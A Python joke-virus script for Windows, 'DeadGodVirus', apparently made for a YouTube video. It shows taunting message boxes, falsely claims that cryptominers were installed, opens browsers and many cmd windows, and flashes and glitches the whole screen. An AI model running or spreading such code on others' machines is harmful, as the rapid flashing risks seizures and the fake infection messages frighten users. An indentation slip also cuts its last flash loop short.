# THIS IS FOR THE VIRUS "DeadGodVirus" CREATED BY spikecze - THIS VIRUS WILL BE UPDATED TO BE MORE DANGEROUS. THE MAIN REASON FOR THIS VIRUS WAS FOR IT TO BE IN A TRANIUM VIDEO ON YOUTUBE.
import ctypes
import webbrowser
import random
import time
import os
os.startfile("furioso melodia.mp3")
ctypes.windll.user32.MessageBoxW(0, "DISCLAIMER: This virus was made by spikecze, this virus is NOT dangerous and can be annoying. Just to warn you, this virus will show flashing lights so EPILEPSY WARNING! Made for Tranium </3", "DeadGodVirus DISCLAIMER", 16)
ctypes.windll.user32.MessageBoxW(0, "DeadGodVirus has gotten into your system, i can't lie but this pc is mine :3 i installed 35655 cryptominers on your computer meow :3", "DeadGodVirus", 16)
ctypes.windll.user32.MessageBoxW(0, "RUNNING THE SPOOKIEST BROWSER EVER...", "DeadGodVirus", 16)
ctypes.windll.user32.MessageBoxW(0, "MICROSOFT EDGE!!!!!!!!!!!!!!!!!!!!!!!!!!!!!", "DeadGodVirus", 16)
ctypes.windll.shell32.ShellExecuteW(
    None,
    "open",
    "msedge.exe",  
    None,
    None,
    1
)
webbrowser.open("https://www.reddit.com/r/learnmath/")
# --- GLITCH EFFECT START ---

user32 = ctypes.windll.user32
gdi32 = ctypes.windll.gdi32

hdc = user32.GetDC(0)

width = user32.GetSystemMetrics(0)
height = user32.GetSystemMetrics(1)

for _ in range(800):
    # glitch blocks
    x = random.randint(0, width)
    y = random.randint(0, height)
    w = random.randint(50, 250)
    h = random.randint(50, 250)

    gdi32.BitBlt(
        hdc,
        x, y,
        w, h,
        hdc,
        x + random.randint(-150, 150),
        y + random.randint(-150, 150),
        0x00CC0020
    )

    # random lines
    x1 = random.randint(0, width)
    y1 = random.randint(0, height)
    x2 = random.randint(0, width)
    y2 = random.randint(0, height)

    gdi32.MoveToEx(hdc, x1, y1, None)
    gdi32.LineTo(hdc, x2, y2)

    time.sleep(0.005)
# --- GLITCH EFFECT END ---
user32 = ctypes.windll.user32
gdi32 = ctypes.windll.gdi32

hdc = user32.GetDC(0)

width = user32.GetSystemMetrics(0)
height = user32.GetSystemMetrics(1)

for _ in range(100):  # how many flashes
    gdi32.BitBlt(
        hdc,
        0, 0,
        width, height,
        hdc,
        0, 0,
        0x00550009  # NOTSRCCOPY (invert colors)
    )
    time.sleep(0.03)

ctypes.windll.user32.ReleaseDC(0, hdc)
# --- END ---
ctypes.windll.user32.MessageBoxW(0, "that was fun right :3", "DeadGodVirus", 16)
ctypes.windll.user32.MessageBoxW(0, "im bored...", "DeadGodVirus", 16)
ctypes.windll.user32.MessageBoxW(0, "Installing: Minecraft Story Mode - A Telltale Games Series (v1.0.0.1)                         DO NOT PANIC IF IT LOOKS STUCK                                            [||||||                               ]   45/100% Completed. ", "FitGirl Repacks", 16)
ctypes.windll.user32.MessageBoxW(0, "...", "DeadGodVirus", 16)
ctypes.windll.user32.MessageBoxW(0, "Are you seriously installing Minecraft Story Mode when im here infecting your computer...", "DeadGodVirus", 16)
ctypes.windll.user32.MessageBoxW(0, "I guess bro...", "DeadGodVirus", 16)

ctypes.windll.user32.MessageBoxW(0, "more flashes :P", "salinewin.exe", 16)


user32 = ctypes.windll.user32
gdi32 = ctypes.windll.gdi32

hdc = user32.GetDC(0)

width = user32.GetSystemMetrics(0)
height = user32.GetSystemMetrics(1)

for _ in range(500):  # how many flashes
    gdi32.BitBlt(
        hdc,
        0, 0,
        width, height,
        hdc,
        0, 0,
        0x00550009  # NOTSRCCOPY (invert colors)
    )
    time.sleep(0.03)





    ctypes.windll.user32.MessageBoxW(0, "ok now im blind oof and btw who invited salinewin", "DeadGodVirus", 16)
    ctypes.windll.user32.MessageBoxW(0, "anyways im gonna go now, bye bye :3     DeadGodVirus V2 coming soon :)", "DeadGodVirus", 16)
    os.startfile("cmd.exe")
    os.startfile("cmd.exe")
    os.startfile("cmd.exe")
    os.startfile("cmd.exe")
    os.startfile("cmd.exe")
    os.startfile("cmd.exe")
    os.startfile("cmd.exe")
    os.startfile("cmd.exe")
    os.startfile("cmd.exe")
    os.startfile("cmd.exe")
    os.startfile("cmd.exe")
    os.startfile("cmd.exe")
    os.startfile("cmd.exe")
    os._exit(0)

